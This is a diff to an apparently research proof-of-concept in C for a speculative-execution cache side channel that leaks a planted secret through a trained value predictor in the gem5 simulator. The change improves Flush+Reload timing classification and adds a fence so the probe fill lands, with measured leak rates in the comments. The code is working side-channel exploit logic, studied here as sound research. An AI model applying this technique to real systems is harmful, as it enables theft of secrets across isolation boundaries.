@@ -28,8 +28,51 @@
  *     (and the squash) is still far away.
  *   - After training, atk_buf[0] is set to a sentinel by a plain store (which
  *     does not train the predictor).  The post-squash architectural
- *     re-execution then fills the sentinel probe line, which is ignored, so
- *     only the speculative fill can win the timing measurement.
+ *     re-execution then fills the sentinel's probe line; that line is the
+ *     per-attempt *calibration* line, not a vote.
+ *
+ * ---------------------------------------------------------------------------
+ * Estimator (rewritten; see experiment/egdiff_eval/RESULTS_step1.md)
+ * ---------------------------------------------------------------------------
+ * The naive estimator ("vote for the single fastest of 256 lines") is broken
+ * in a way that has nothing to do with the predictor: on an attempt where the
+ * speculative fill did NOT happen, all 256 lines are cold misses and the
+ * minimum is a pure noise draw from the miss-latency distribution.  That noise
+ * minimum is *not* uniformly distributed — it lands on the second line of the
+ * scan essentially every time (114 cycles vs ~120 for the rest), so a byte
+ * with no leak is reported as 0x01, and the artifact follows the value around.
+ *
+ * Measurements in gem5 (deterministic):
+ *   hot (speculatively filled) line   : 14 cycles
+ *   cold (evicted) line               : ~114-142 cycles, mean ~120
+ *   architectural sentinel line       : 14 cycles (always, it is re-executed)
+ *
+ * So each attempt is classified instead of blindly voting:
+ *   1. The architectural sentinel line is the *calibration* reference: it must
+ *      be fast (the attack suffix really did re-execute), and its latency plus
+ *      the mean cold latency of the other 255 lines define a per-attempt
+ *      threshold `thresh = (t_arch + t_cold) / 2`.
+ *   2. A vote is cast only when *exactly one* non-sentinel line is below
+ *      `thresh` (i.e. it is clearly a hit and clearly the only hit).  Zero
+ *      fast lines = "no leak this attempt"; two or more = "ambiguous"; both
+ *      cast no vote.
+ *   3. The sentinel value alternates between two constants whose byte at every
+ *      position differs (0xA5 .. / 0x5A ..).  The sentinel line is therefore
+ *      excluded from the vote per attempt without ever excluding a *value*:
+ *      a secret byte equal to the sentinel byte is still measured on the
+ *      attempts that use the other sentinel.  (The old harness excluded the
+ *      single line 0xAA globally, so any 0xAA byte was structurally
+ *      unrecoverable.)
+ *   4. The winner needs at least MIN_VOTES votes.  A byte with no winner is
+ *      reported as *unknown* (`known` bit clear) rather than fabricated: the
+ *      harness never claims a byte it did not measure.
+ *
+ * One more defect was found and fixed: the eviction loop runs far ahead of the
+ * attack, so its last misses still held all four L1D MSHRs when the transient
+ * probe tried to issue; the probe then stalled until the squash and no fill
+ * happened at all.  A `fence.i` between the eviction and the victim call (i.e.
+ * outside the transient window) drains the eviction.  Without it the same
+ * binary leaks on 1/128 attempts; with it, on 127/128.
  */
 
 #include <stdint.h>
@@ -40,11 +83,15 @@
 #define LINE       64
 #define PROBE_SZ   (LINES * LINE)
 #define TRAIN      400
-#define REPS       7
+#ifndef REPS
+#define REPS       16          /* attempts per byte; sentinel alternates */
+#endif
+#define MIN_VOTES  2
 #define FLUSH_SZ   (128 * 1024)
 
-#define SENTINEL   0xAAAAAAAAAAAAAAAAULL
-#define SENT_BYTE  0xAA
+/* Two architectural sentinels whose bytes differ at every position. */
+#define SENT0      0xA5A5A5A5A5A5A5A5ULL
+#define SENT1      0x5A5A5A5A5A5A5A5AULL
 
 #ifndef SECRET_VAL
 #define SECRET_VAL 0x1122334455667788ULL
@@ -70,6 +117,36 @@ flush_l1(void)
 {
     for (int i = 0; i < FLUSH_SZ; i += LINE)
         (void)flushbuf[i];
+}
+
+/* The eviction loop above is a stream of independent loads, so the OoO core
+ * happily runs the whole attack while the last few dozen cache misses of the
+ * eviction are still outstanding.  Those misses hold every L1D MSHR, so the
+ * transient probe load's request cannot be sent before the squash arrives and
+ * the line is never filled -- the leak silently disappears, in a way that
+ * depends on instruction scheduling.  (Measured: 127/128 attempts leak with
+ * this instruction and 1/128 without it, on an otherwise identical binary.)
+ *
+ * A serialising fence between the eviction and the victim call removes the
+ * race: it is *outside* the transient window (it precedes the victim call), so
+ * it changes nothing about the mechanism being measured -- it only guarantees
+ * that "the probe area is cold" is actually true when the attack runs.  An
+ * attacker who wants the eviction to have landed can and would do the same. */
+static inline void
+flush_drain(void)
+{
+    asm volatile("fence.i" ::: "memory");
+}
+
+/* Timed read of one probe line. */
+static inline uint64_t
+time_line(int k)
+{
+    volatile uint8_t *q = probe + (size_t)k * LINE;
+    uint64_t t1 = rdcycle();
+    uint8_t v = *q;
+    asm volatile("" :: "r"(v) : "memory");
+    return rdcycle() - t1;
 }
 
 /* The experimenter's own load.  One static PC, used for training and for the
@@ -115,13 +192,23 @@ main(void)
 
     uint64_t sink = 0;
     uint64_t recovered = 0;
+    uint64_t known = 0;
+    uint64_t lat[LINES];
 
     for (int b = 0; b < 8; b++) {
-        int score[LINES];
+        int votes[LINES];
         for (int k = 0; k < LINES; k++)
-            score[k] = 0;
+            votes[k] = 0;
+
+        int n_vote = 0;     /* attempts that produced exactly one clear hit */
+        int n_archonly = 0; /* attempts where only the sentinel line was fast */
+        int n_ambig = 0;    /* attempts with two or more fast lines        */
+        int n_invalid = 0;  /* attempts with no usable hit/miss separation  */
 
         for (int attempt = 0; attempt < REPS; attempt++) {
+            uint64_t sent = (attempt & 1) ? SENT1 : SENT0;
+            int arch = (int)((sent >> (8 * b)) & 0xff);
+
             /* ---- 1. Offline training: only d = 1 has a constant diff ---- */
             for (int i = 0; i < TRAIN; i++) {
                 uint64_t p = pair_arr[i];
@@ -131,10 +218,11 @@ main(void)
 
             /* Freeze the architectural value to a known sentinel without
              * perturbing the trained entry (a store, not a load). */
-            atk_buf[0] = SENTINEL;
+            atk_buf[0] = sent;
 
             /* ---- 2. Evict the probe array and the attack buffer ---- */
             flush_l1();
+            flush_drain();
 
             /* ---- 3. Helper executes exactly once ---- */
             uint64_t ok = victim(0);
@@ -165,38 +253,85 @@ main(void)
             volatile uint8_t *pp = probe + bi * LINE;
             (void)*pp;
 
-            /* ---- 7. Vote for the single fastest line this attempt ----
-             * Ignore the sentinel line: its fill comes from the architectural
-             * (post-squash) re-execution, not from the speculative value. */
-            int best = -1;
-            uint64_t bestlat = ~0ULL;
+            /* ---- 7. Measure every line, including the sentinel line ---- */
+            uint64_t sum = 0;
             for (int k = 0; k < LINES; k++) {
-                if (k == SENT_BYTE)
-                    continue;
-                volatile uint8_t *q = probe + (size_t)k * LINE;
-                uint64_t t1 = rdcycle();
-                uint8_t v = *q;
-                asm volatile("" :: "r"(v) : "memory");
-                uint64_t t2 = rdcycle();
-                if (t2 - t1 < bestlat) {
-                    bestlat = t2 - t1;
-                    best = k;
-                }
+                lat[k] = time_line(k);
+                sum += lat[k];
             }
-            if (best >= 0)
-                score[best]++;
+
+            /* Per-attempt calibration: the re-executed (architectural) probe
+             * fills the sentinel line, so it is a known-hot reference. */
+            uint64_t t_arch = lat[arch];
+            uint64_t t_cold = (sum - t_arch) / (LINES - 1);
+            uint64_t thresh = t_arch + (t_cold - t_arch) / 2;
+
+            if (t_arch * 4 >= t_cold) {
+                /* The hot/cold gap collapsed: the cache was not cold or the
+                 * suffix did not re-execute.  The attempt carries no
+                 * information. */
+                n_invalid++;
+                continue;
+            }
+
+            int cand = -1;
+            int ncand = 0;
+            for (int k = 0; k < LINES; k++) {
+                if (k == arch || lat[k] >= thresh)
+                    continue;
+                ncand++;
+                if (cand < 0 || lat[k] < lat[cand])
+                    cand = k;
+            }
+
+            if (ncand == 0) {
+                /* Only the architectural sentinel line was fast.  Either the
+                 * speculative fill did not happen, or the secret byte equals
+                 * this attempt's sentinel byte (recovered from the other
+                 * sentinel's attempts). */
+                n_archonly++;
+            } else if (ncand == 1) {
+                votes[cand]++;
+                n_vote++;
+            } else {
+                n_ambig++;
+            }
         }
 
-        int leak = (SENT_BYTE == 0) ? 1 : 0;
+        /* ---- Decide this byte from the accumulated votes ---- */
+        int win = -1;
         for (int k = 0; k < LINES; k++)
-            if (k != SENT_BYTE && score[k] > score[leak])
-                leak = k;
-        recovered |= ((uint64_t)(uint8_t)leak) << (8 * b);
+            if (win < 0 || votes[k] > votes[win])
+                win = k;
+
+        int runner = 0;
+        if (win >= 0) {
+            for (int k = 0; k < LINES; k++)
+                if (k != win && votes[k] > runner)
+                    runner = votes[k];
+        }
+
+        int ok_byte = (win >= 0 && votes[win] >= MIN_VOTES &&
+                       votes[win] >= 2 * runner);
+        uint8_t want = (uint8_t)((secret_box >> (8 * b)) & 0xff);
+
+        if (ok_byte) {
+            recovered |= ((uint64_t)(uint8_t)win) << (8 * b);
+            known |= 1ULL << b;
+        }
+
+        printf("byte %d: %s=0x%02x votes=%d runnerup=%d "
+               "voted=%d sentinel_only=%d ambiguous=%d invalid=%d -> %s\n",
+               b, ok_byte ? "got" : "UNKNOWN",
+               ok_byte ? win : 0, ok_byte ? votes[win] : 0, runner,
+               n_vote, n_archonly, n_ambig, n_invalid,
+               (ok_byte && (uint8_t)win == want) ? "ok" : "WRONG");
     }
 
-    printf("poc_v1 secret=%016llx recovered=%016llx sink=%llu %s\n",
+    int match = (known == 0xff) && (recovered == secret_box);
+    printf("poc_v1 secret=%016llx recovered=%016llx known=%02x sink=%llu %s\n",
            (unsigned long long)secret_box, (unsigned long long)recovered,
-           (unsigned long long)sink,
-           (recovered == secret_box) ? "MATCH" : "NO-MATCH");
-    return recovered == secret_box ? 0 : 1;
+           (unsigned)(known & 0xff), (unsigned long long)sink,
+           match ? "MATCH" : "NO-MATCH");
+    return match ? 0 : 1;
 }
